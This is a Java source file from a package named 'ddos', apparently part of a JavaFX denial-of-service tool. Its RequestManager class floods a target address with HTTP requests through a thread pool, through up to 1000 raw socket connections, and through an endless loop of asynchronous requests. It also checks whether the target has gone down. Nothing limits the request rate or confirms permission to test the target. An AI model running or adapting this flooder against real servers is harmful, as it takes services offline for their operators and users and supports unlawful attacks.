package com.proj.ddos;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.URI;
import java.net.URL;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousChannelGroup;
import java.nio.channels.AsynchronousSocketChannel;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.atomic.AtomicInteger;

import javafx.beans.property.BooleanProperty;
import javafx.beans.property.IntegerProperty;
import javafx.beans.property.SimpleBooleanProperty;
import javafx.beans.property.SimpleIntegerProperty;

public class RequestManager {
    private URI address;
    private ThreadPoolExecutor pool;

    private BooleanProperty isRunning;
    private IntegerProperty runningThreadCount;

    private int maxThreadCount;

    public final BooleanProperty getIsRunningProperty() {
        return this.isRunning;
    }

    public final IntegerProperty getThreadCountProperty() {
        return this.runningThreadCount;
    }

    public RequestManager(URI address) {
        this.address = address;
        this.isRunning = new SimpleBooleanProperty(false);
        this.maxThreadCount = 50;
        this.runningThreadCount = new SimpleIntegerProperty(0);
    }

    public RequestManager(URI address, int maxThreadCount) {
        this.address = address;
        this.isRunning = new SimpleBooleanProperty(false);
        this.maxThreadCount = maxThreadCount;
        this.runningThreadCount = new SimpleIntegerProperty(0);
    }

    private void threadedApproach() {
        // threaded approach
        {
            var client = HttpClient.newBuilder().build();
            pool.submit(() -> {
                for (int ii = 0; ii < this.maxThreadCount; ii++) {
                    pool.execute(new RequestThread(this.address, client));
                }
            });
            pool.submit(() -> {
                while (true) {
                    this.runningThreadCount.set(pool.getActiveCount());
                }
            });
        }
    }

    private void openSocketsApproach() {
        {
            try {
                var asyncChannelGroup = AsynchronousChannelGroup.withThreadPool(pool);
                var inetAddr = new InetSocketAddress(this.address.getHost(), this.address.getPort());
                final var completedReqCount = new AtomicInteger(0);
                pool.submit(() -> {
                    for (int ii = 0; ii < 1000; ii++) {
                        CompletableFuture.runAsync(() -> {
                            try {
                                var buf = ByteBuffer.wrap("GET / HTTP/1.1".getBytes());
                                var sock = AsynchronousSocketChannel.open(asyncChannelGroup);
                                sock.connect(inetAddr).get();
                                sock.write(buf).get();
                                // buf.rewind();
                                // buf.position(0);
                                var readBytes = sock.read(buf).get();
                                // sock.close();
                                var completedCount = completedReqCount.incrementAndGet();
                                RequestThread.LOGGER.info("request " + completedCount + " completed");
                                if (readBytes < 1) {
                                    RequestThread.LOGGER.info("no bytes returned for request " + completedCount);
                                } else {
                                    RequestThread.LOGGER.info("request " + completedCount + " got response "
                                            + buf.asCharBuffer().toString());
                                }
                                // if (completedCount == REQUEST_COUNT) {
                                // pool.shutdownNow();
                                // System.exit(0);
                                // }
                            } catch (Exception e) {
                                // TODO: handle exception
                                RequestThread.LOGGER.catching(e);
                            }
                        }, pool);
                    }
                });

            } catch (IOException e) {
                RequestThread.LOGGER.catching(e);
            }
        }
    }

    private void asyncApproach() {
        var client = HttpClient.newBuilder().build();
        final var completedReqCount = new AtomicInteger(0);
        pool.submit(() -> {
            var requestBuilder = HttpRequest.newBuilder().uri(address);
            while (true) {
                {
                    // TODO: share thread pool with the runners
                    client.sendAsync(requestBuilder.build(), HttpResponse.BodyHandlers.ofString())
                            .thenAcceptAsync(response -> {
                                var number = completedReqCount.incrementAndGet();
                                RequestThread.LOGGER.info(String.format("Thread %d sent request", number));
                                if (response.statusCode() >= 200 || response.statusCode() < 300) {
                                    RequestThread.LOGGER.info(String.format("Thread %d recieved status %d ", number,
                                            response.statusCode()));
                                    // LOGGER.log(Level.toLevel(CustomLevels.SUCC_RESP_NAME),
                                    // String.format("Thread %d recieved status %d ", this.number,
                                    // response.statusCode()));
                                } else {
                                    RequestThread.LOGGER
                                            .warn(String.format("Thread %d request failed with status code %d", number,
                                                    response.statusCode()));
                                    // LOGGER.log(Level.toLevel(CustomLevels.FAIL_RESP_NAME),
                                    // String.format("Thread %d request failed with status code %d",
                                    // this.number, response.statusCode()));
                                }
                            });
                }
                RequestThread.incrementCounter();
            }
        });
    }

    public void start() {
        pool = (ThreadPoolExecutor) Executors.newFixedThreadPool(this.maxThreadCount);
        asyncApproach();
        this.isRunning.set(true);
    }

    public void stop() {
        pool.shutdownNow();
        this.isRunning.set(false);
    }

    public boolean checkAvailability() {
        try {
            (address.toURL()).openStream().close();
            return true;
        } catch (IOException ex) {
            return false;
        }
    }
}
